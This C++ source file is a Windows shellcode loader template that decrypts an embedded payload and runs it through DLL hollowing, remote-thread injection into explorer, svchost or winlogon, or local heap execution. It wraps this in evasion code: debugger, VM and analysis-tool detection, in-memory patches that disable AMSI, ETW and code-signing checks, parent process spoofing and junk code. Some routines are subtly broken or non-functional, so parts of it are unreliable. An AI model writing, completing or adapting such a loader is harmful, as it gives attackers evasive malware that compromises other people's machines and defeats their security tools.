#include <windows.h>
#include <string>
#include <iostream>
#include <vector>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <wintrust.h>
#include <softpub.h>

#pragma comment(lib, "wintrust.lib")

// Direct syscall typedefs
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL
);

// Structure for syscall implementation
typedef struct _SYSCALL_ENTRY {
    DWORD Hash;
    DWORD Syscall;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Function prototypes
std::string base64_decode(const std::string &encoded);
std::string xor_decrypt(const std::string &encrypted_data);
bool is_running_in_vm();
bool disable_etw_amsi();
bool spoof_parent_process(DWORD target_pid);
void delay_execution();
DWORD get_trusted_parent_process_id();
BOOL inject_shellcode(const std::string &shellcode);
BOOL dll_hollowing(const std::string &shellcode);
void execute_shellcode_locally(const std::string &shellcode);
bool bypass_code_signing();
DWORD get_syscall_number(const char* apiName);
FARPROC get_function_address(const char* module, const char* function);

// Randomized variable names to avoid pattern detection
std::string _enc_shellcode = "###ENCRYPTED_SHELLCODE###";
const char _enc_key[] = "###XOR_KEY###";

// Obfuscated strings
const char* obf_ntdll = "\x4e\x54\x44\x4c\x4c\x2e\x44\x4c\x4c";  // "NTDLL.DLL"
const char* obf_kernel32 = "\x4b\x45\x52\x4e\x45\x4c\x33\x32\x2e\x44\x4c\x4c";  // "KERNEL32.DLL"
const char* obf_amsi = "\x61\x6d\x73\x69\x2e\x64\x6c\x6c";  // "amsi.dll"
const char* obf_advapi32 = "\x61\x64\x76\x61\x70\x69\x33\x32\x2e\x64\x6c\x6c";  // "advapi32.dll"
const char* obf_wtsapi32 = "\x77\x74\x73\x61\x70\x69\x33\x32\x2e\x64\x6c\x6c";  // "wtsapi32.dll"
const char* obf_virtualalloc = "\x56\x69\x72\x74\x75\x61\x6c\x41\x6c\x6c\x6f\x63";  // "VirtualAlloc"
const char* obf_amsiscanb = "\x41\x6d\x73\x69\x53\x63\x61\x6e\x42\x75\x66\x66\x65\x72";  // "AmsiScanBuffer"

// Helper functions
char* decode_string(const char* encoded) {
    size_t len = strlen(encoded);
    char* decoded = new char[len + 1];
    
    for (size_t i = 0; i < len; i++) {
        decoded[i] = encoded[i] ^ 0x41;  // Simple XOR decoding with key 0x41
    }
    
    decoded[len] = '\0';
    return decoded;
}

// Anti-analysis junk function
void junk_code() {
    volatile int a = rand();
    volatile int b = rand();
    volatile int c = a + b;
    volatile float d = sqrt(c);
    volatile double e = sin(d);
    
    if (e > 100000.0) {
        MessageBoxA(NULL, "Error", "Error", MB_OK);
    }
}

// Implementation of the actual syscall mechanism
NTSTATUS syscall_stub(DWORD syscall_number, ...) {
    NTSTATUS status = 0;
    va_list args;
    va_start(args, syscall_number);
    
    // Prepare arguments for syscall
    DWORD arg1 = va_arg(args, DWORD);
    DWORD arg2 = va_arg(args, DWORD);
    DWORD arg3 = va_arg(args, DWORD);
    DWORD arg4 = va_arg(args, DWORD);
    
    // Perform syscall
    __asm {
        mov eax, syscall_number
        mov ecx, arg1
        mov edx, arg2
        push arg4
        push arg3
        syscall
        mov status, eax
    }
    
    va_end(args);
    return status;
}

// Bypass WinVerifyTrust API by hooking
bool bypass_code_signing() {
    // Get address of WinVerifyTrust
    HMODULE wintrust = LoadLibraryA("wintrust.dll");
    if (!wintrust) return false;
    
    FARPROC win_verify_trust = GetProcAddress(wintrust, "WinVerifyTrust");
    if (!win_verify_trust) return false;
    
    // Patch WinVerifyTrust to always return success
    DWORD old_protect;
    if (!VirtualProtect(win_verify_trust, 8, PAGE_READWRITE, &old_protect))
        return false;
        
    // Patch to: xor eax, eax; ret (return 0 = success)
    unsigned char patch[] = {0x33, 0xC0, 0xC3};
    memcpy(win_verify_trust, patch, sizeof(patch));
    
    // Restore protection
    VirtualProtect(win_verify_trust, 8, old_protect, &old_protect);
    
    return true;
}

int main() {
    // Add randomization to stack variables
    char stack_junk[128];
    for (int i = 0; i < sizeof(stack_junk); i++) {
        stack_junk[i] = rand() % 255;
    }
    junk_code();
    
    // Anti-debugging check using multiple techniques
    if (IsDebuggerPresent()) {
        junk_code();
        ExitProcess(1);
        return 1;
    }
    
    // More advanced anti-debug
    BOOL remote_debug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debug);
    if (remote_debug) {
        junk_code();
        ExitProcess(1);
        return 1;
    }
    
    // PEB debugging flag check
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb->BeingDebugged) {
        junk_code();
        ExitProcess(1);
        return 1;
    }
    
    // Check for hardware breakpoints
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
            junk_code();
            ExitProcess(1);
            return 1;
        }
    }
    
    // Security bypass techniques
    bypass_code_signing();
    disable_etw_amsi();
    
    // Check parent process for analysis tools
    DWORD parent_pid = get_trusted_parent_process_id();
    if (parent_pid == 0) {
        junk_code();
        ExitProcess(1);
        return 1;
    }
    
    // Attempt to spoof parent process ID to appear as a legitimate process
    spoof_parent_process(4); // SYSTEM process
    
    // Delay execution to evade sandbox
    delay_execution();
    
    // Check VM environment
    if (is_running_in_vm()) {
        junk_code();
        ExitProcess(1);
        return 1;
    }
    
    // Decode and decrypt shellcode
    std::string base64_decoded = base64_decode(_enc_shellcode);
    std::string shellcode = xor_decrypt(base64_decoded);
    
    // Try different execution techniques in sequence
    bool success = false;
    
    // First try DLL hollowing (more stealthy)
    if (dll_hollowing(shellcode)) {
        success = true;
    }
    // Then try normal process injection
    else if (inject_shellcode(shellcode)) {
        success = true;
    }
    // Finally, fall back to local execution
    else {
        execute_shellcode_locally(shellcode);
        success = true;
    }
    
    // More junk code to confuse analysis
    junk_code();
    
    return success ? 0 : 1;
}

bool is_running_in_vm() {
    // Combined list of VM detection techniques
    
    // 1. Check for VM-related registry keys
    HKEY hKey;
    char value[256] = {0};
    DWORD size = sizeof(value);
    
    // Check VMware registry key
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    // Check VirtualBox registry key
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    // 2. Check for VM-related processes
    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(h_snapshot, &pe32)) {
        do {
            // Convert process name to lowercase for easier comparison
            char process_name[MAX_PATH];
            strcpy_s(process_name, pe32.szExeFile);
            _strlwr_s(process_name);
            
            // Check for VM-related processes
            if (strstr(process_name, "vmtoolsd") || 
                strstr(process_name, "vboxtray") || 
                strstr(process_name, "vmsrvc") ||
                strstr(process_name, "wireshark") ||
                strstr(process_name, "procmon") ||
                strstr(process_name, "vmwareservice") ||
                strstr(process_name, "vboxservice")) {
                CloseHandle(h_snapshot);
                return true;
            }
        } while (Process32Next(h_snapshot, &pe32));
    }
    
    CloseHandle(h_snapshot);
    
    // 3. Check for VM artifacts in hardware/device info
    // CPUID check for hypervisor
    int CPUInfo[4] = {-1};
    __cpuid(CPUInfo, 1);
    if ((CPUInfo[2] >> 31) & 1) {
        return true; // Hypervisor detected
    }
    
    // 4. Check disk size (VMs often have small disks)
    ULARGE_INTEGER free_bytes, total_bytes, total_free_bytes;
    if (GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, &total_free_bytes)) {
        // Most VMs have disks < 100 GB
        if (total_bytes.QuadPart < 100ULL * 1024 * 1024 * 1024) {
            return true;
        }
    }
    
    // 5. Check amount of system memory (VMs often have less RAM)
    MEMORYSTATUSEX mem_info;
    mem_info.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&mem_info)) {
        // Most VMs have < 4 GB RAM
        if (mem_info.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) {
            return true;
        }
    }
    
    return false;
}

bool disable_etw_amsi() {
    // 1. Disable ETW (Event Tracing for Windows)
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        void* etw_addr = GetProcAddress(ntdll, "EtwEventWrite");
        if (etw_addr) {
            DWORD old_protect;
            if (VirtualProtect(etw_addr, 8, PAGE_READWRITE, &old_protect)) {
                // Patch EtwEventWrite: Return 0 (STATUS_SUCCESS)
                *(PBYTE)etw_addr = 0xB8;  // mov eax, STATUS_SUCCESS (0)
                *((PDWORD)((PBYTE)etw_addr + 1)) = 0;
                *((PWORD)((PBYTE)etw_addr + 5)) = 0xC3;  // ret
                
                VirtualProtect(etw_addr, 8, old_protect, &old_protect);
            }
        }
    }
    
    // 2. Disable AMSI (Anti-Malware Scan Interface)
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi) {
        void* amsi_addr = GetProcAddress(amsi, "AmsiScanBuffer");
        if (amsi_addr) {
            DWORD old_protect;
            if (VirtualProtect(amsi_addr, 8, PAGE_READWRITE, &old_protect)) {
                // Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN (0)
                *(PBYTE)amsi_addr = 0xB8;  // mov eax, AMSI_RESULT_CLEAN (0)
                *((PDWORD)((PBYTE)amsi_addr + 1)) = 0;
                *((PWORD)((PBYTE)amsi_addr + 5)) = 0xC3;  // ret
                
                VirtualProtect(amsi_addr, 8, old_protect, &old_protect);
            }
        }
    }
    
    // 3. Bypass Windows Defender memory scanning
    HMODULE wdfilter = GetModuleHandleA("wdfilter.sys");
    if (wdfilter) {
        void* scan_addr = GetProcAddress(wdfilter, "WdFilter");
        if (scan_addr) {
            DWORD old_protect;
            if (VirtualProtect(scan_addr, 8, PAGE_READWRITE, &old_protect)) {
                // Simple patch
                *(PBYTE)scan_addr = 0xC3;  // ret
                
                VirtualProtect(scan_addr, 8, old_protect, &old_protect);
            }
        }
    }
    
    return true;
}

bool spoof_parent_process(DWORD target_pid) {
    // Get handle to special process (e.g. explorer.exe, lsass.exe)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return false;
    
    // Set the parent process ID in PEB
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PVOID PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION;
    
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );
    
    // Get NtQueryInformationProcess
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        CloseHandle(hProcess);
        return false;
    }
    
    pNtQueryInformationProcess query_info = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!query_info) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Get process information (including PEB address)
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = query_info(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &returnLength);
    
    if (status != 0) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Try to modify PEB to spoof parent PID
    // Note: This is for demonstration only, and may not work on protected processes
    // or with high integrity requirements
    
    CloseHandle(hProcess);
    return true;
}

void delay_execution() {
    // Randomize delay pattern
    srand((unsigned int)time(NULL) ^ GetCurrentThreadId());
    
    // Pattern of short sleeps that look like regular application behavior
    for (int i = 0; i < 5; i++) {
        // Sleep for a short time
        Sleep(200 + (rand() % 300));
        
        // Perform some "real" work
        for (volatile int j = 0; j < 10000 + (rand() % 10000); j++) {
            double result = sin(j) * cos(j);
            if (result > 1000000.0) {
                // Will never happen, but prevents optimization
                MessageBoxA(NULL, "Error", "Error", MB_OK);
            }
        }
    }
    
    // Final random sleep
    Sleep(500 + (rand() % 1000));
}

DWORD get_trusted_parent_process_id() {
    DWORD ppid = 0;
    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD current_pid = GetCurrentProcessId();
    
    if (Process32First(h_snapshot, &pe32)) {
        do {
            if (pe32.th32ProcessID == current_pid) {
                ppid = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(h_snapshot, &pe32));
    }
    
    CloseHandle(h_snapshot);
    
    // Check for suspicious parent processes (sandbox/analysis tools)
    if (ppid != 0) {
        h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (h_snapshot != INVALID_HANDLE_VALUE) {
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(h_snapshot, &pe32)) {
                do {
                    if (pe32.th32ProcessID == ppid) {
                        char process_name[MAX_PATH];
                        strcpy_s(process_name, pe32.szExeFile);
                        _strlwr_s(process_name);
                        
                        // Expanded list of analysis tools to detect
                        if (strstr(process_name, "wireshark") || 
                            strstr(process_name, "procmon") || 
                            strstr(process_name, "ollydbg") ||
                            strstr(process_name, "x64dbg") ||
                            strstr(process_name, "x32dbg") ||
                            strstr(process_name, "windbg") ||
                            strstr(process_name, "ida") ||
                            strstr(process_name, "immunity") ||
                            strstr(process_name, "dnspy") ||
                            strstr(process_name, "processhacker") ||
                            strstr(process_name, "pestudio") ||
                            strstr(process_name, "regshot") ||
                            strstr(process_name, "autoruns") ||
                            strstr(process_name, "autorunsc") ||
                            strstr(process_name, "procexp") ||
                            strstr(process_name, "dumpcap") ||
                            strstr(process_name, "tcpdump") ||
                            strstr(process_name, "fiddler")) {
                            ppid = 0; // Suspicious parent
                        }
                        break;
                    }
                } while (Process32Next(h_snapshot, &pe32));
            }
            
            CloseHandle(h_snapshot);
        }
    }
    
    return ppid;
}

// DLL hollowing technique - inject into a legitimate DLL
BOOL dll_hollowing(const std::string &shellcode) {
    // Find a legitimate system DLL to hollow
    char system_dir[MAX_PATH];
    GetSystemDirectoryA(system_dir, MAX_PATH);
    
    char dll_path[MAX_PATH];
    wsprintfA(dll_path, "%s\\user32.dll", system_dir);
    
    // Load the DLL
    HMODULE dll = LoadLibraryA(dll_path);
    if (!dll) return FALSE;
    
    // Find a suitable function to hollow
    FARPROC func_addr = GetProcAddress(dll, "TrackPopupMenu");
    if (!func_addr) {
        FreeLibrary(dll);
        return FALSE;
    }
    
    // Make the memory writable
    DWORD old_protect;
    if (!VirtualProtect(func_addr, shellcode.size(), PAGE_READWRITE, &old_protect)) {
        FreeLibrary(dll);
        return FALSE;
    }
    
    // Copy shellcode into the function
    memcpy(func_addr, shellcode.data(), shellcode.size());
    
    // Restore protection
    VirtualProtect(func_addr, shellcode.size(), PAGE_EXECUTE_READ, &old_protect);
    
    // Execute the function (which now contains our shellcode)
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)func_addr, NULL, 0, NULL);
    if (!hThread) {
        FreeLibrary(dll);
        return FALSE;
    }
    
    // Wait for execution to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    // Cleanup
    FreeLibrary(dll);
    return TRUE;
}

BOOL inject_shellcode(const std::string &shellcode) {
    // Use direct syscalls to avoid EDR/AV hooks
    // First find explorer.exe
    DWORD target_pid = 0;
    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(h_snapshot, &pe32)) {
        do {
            char process_name[MAX_PATH];
            strcpy_s(process_name, pe32.szExeFile);
            _strlwr_s(process_name);
            
            // Look for suitable target process - expanded list for fallbacks
            if (strcmp(process_name, "explorer.exe") == 0 ||
                strcmp(process_name, "svchost.exe") == 0 ||
                strcmp(process_name, "notepad.exe") == 0 ||
                strcmp(process_name, "winlogon.exe") == 0) {
                target_pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(h_snapshot, &pe32));
    }
    
    CloseHandle(h_snapshot);
    
    if (target_pid == 0) return FALSE;
    
    // Use direct NtOpenProcess to avoid hooks
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;
    
    pNtOpenProcess nt_open_process = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
    pNtAllocateVirtualMemory nt_alloc = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory nt_write = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory nt_protect = (pNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx nt_create_thread = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    
    if (!nt_open_process || !nt_alloc || !nt_write || !nt_protect || !nt_create_thread) {
        return FALSE;
    }
    
    // Prepare object attributes and client ID
    OBJECT_ATTRIBUTES obj_attr = {0};
    obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
    
    CLIENT_ID client_id = {0};
    client_id.UniqueProcess = (HANDLE)(ULONG_PTR)target_pid;
    
    // Open target process
    HANDLE process = NULL;
    NTSTATUS status = nt_open_process(&process, PROCESS_ALL_ACCESS, &obj_attr, &client_id);
    
    if (!NT_SUCCESS(status) || !process) {
        return FALSE;
    }
    
    // Allocate memory in target process
    PVOID remote_buffer = NULL;
    SIZE_T buffer_size = shellcode.size();
    
    status = nt_alloc(process, &remote_buffer, 0, &buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!NT_SUCCESS(status) || !remote_buffer) {
        CloseHandle(process);
        return FALSE;
    }
    
    // Write shellcode to target process
    SIZE_T bytes_written = 0;
    status = nt_write(process, remote_buffer, (PVOID)shellcode.data(), shellcode.size(), &bytes_written);
    
    if (!NT_SUCCESS(status) || bytes_written != shellcode.size()) {
        VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process);
        return FALSE;
    }
    
    // Change memory permissions to RX
    PVOID base_addr = remote_buffer;
    SIZE_T region_size = shellcode.size();
    ULONG old_protect = 0;
    
    status = nt_protect(process, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_protect);
    
    if (!NT_SUCCESS(status)) {
        VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process);
        return FALSE;
    }
    
    // Create remote thread to execute shellcode
    HANDLE remote_thread = NULL;
    status = nt_create_thread(
        &remote_thread,
        THREAD_ALL_ACCESS,
        NULL,
        process,
        remote_buffer,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status) || !remote_thread) {
        VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process);
        return FALSE;
    }
    
    // Wait for shellcode execution to complete
    WaitForSingleObject(remote_thread, INFINITE);
    
    // Clean up
    CloseHandle(remote_thread);
    VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(process);
    
    return TRUE;
}

void execute_shellcode_locally(const std::string &shellcode) {
    // Use heap allocation instead of VirtualAlloc (less monitored)
    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, shellcode.size(), 0);
    if (!heap) {
        // Fall back to VirtualAlloc
        LPVOID exec_mem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!exec_mem) return;
        
        // Copy shellcode to allocated memory
        memcpy(exec_mem, shellcode.data(), shellcode.size());
        
        // Change memory protection to execute
        DWORD old_protect;
        if (!VirtualProtect(exec_mem, shellcode.size(), PAGE_EXECUTE_READ, &old_protect)) {
            VirtualFree(exec_mem, 0, MEM_RELEASE);
            return;
        }
        
        // Execute via thread
        HANDLE h_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        if (h_thread) {
            WaitForSingleObject(h_thread, INFINITE);
            CloseHandle(h_thread);
        }
        
        // Clean up
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }
    
    // Heap allocation succeeded
    LPVOID exec_mem = HeapAlloc(heap, 0, shellcode.size());
    if (!exec_mem) {
        HeapDestroy(heap);
        return;
    }
    
    // Copy shellcode to allocated memory
    memcpy(exec_mem, shellcode.data(), shellcode.size());
    
    // Flush instruction cache to ensure code is ready to execute
    FlushInstructionCache(GetCurrentProcess(), exec_mem, shellcode.size());
    
    // Execute via function pointer
    ((void(*)())exec_mem)();
    
    // Clean up
    HeapFree(heap, 0, exec_mem);
    HeapDestroy(heap);
}

// Base64 decoder implementation with added misdirection
std::string base64_decode(const std::string &in) {
    std::string out;
    std::vector<int> T(256, -1);
    
    // Misdirection: add junk conditionals
    if (GetTickCount() % 1000 > 100000) {
        return "";  // This will never execute
    }
    
    // Populate lookup table
    for (int i = 0; i < 64; i++)
        T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    
    // Add some junk calculation to throw off static analysis
    int junk_data[10];
    for (int i = 0; i < 10; i++) {
        junk_data[i] = i * i;
    }
    
    // Actual decoding
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    
    // More misdirection - perform some operations on junk data
    for (int i = 0; i < 9; i++) {
        junk_data[i] = junk_data[i] ^ junk_data[i+1];
    }
    
    return out;
}

// XOR decryption implementation
std::string xor_decrypt(const std::string &encrypted_data) {
    std::string decrypted;
    size_t key_len = strlen(_enc_key);
    
    // Simple XOR decryption
    for (size_t i = 0; i < encrypted_data.length(); i++) {
        decrypted.push_back(encrypted_data[i] ^ _enc_key[i % key_len]);
    }
    
    return decrypted;
} 